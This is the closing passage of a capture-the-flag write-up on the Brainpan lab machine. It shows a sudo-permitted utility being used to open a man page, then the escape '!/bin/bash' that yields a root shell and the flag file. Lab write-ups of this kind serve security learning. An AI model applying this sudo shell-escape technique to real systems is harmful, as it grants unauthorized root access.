```

Running the utility I get 3 options, manual looks interesting as I can choose a command.

```highlight
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual bash
```

I am presented with the man page for bash so I can try to break out of the manual by typing: !/bin/bash

```highlight
root@brainpan:/usr/share/man# id
uid=0(root) gid=0(root) groups=0(root)
root@brainpan:/usr/share/man# cd /root
root@brainpan:~# ls
b.txt
root@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 
```

I exit the manual as root! 

Thats the box, thanks for reading!

============================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

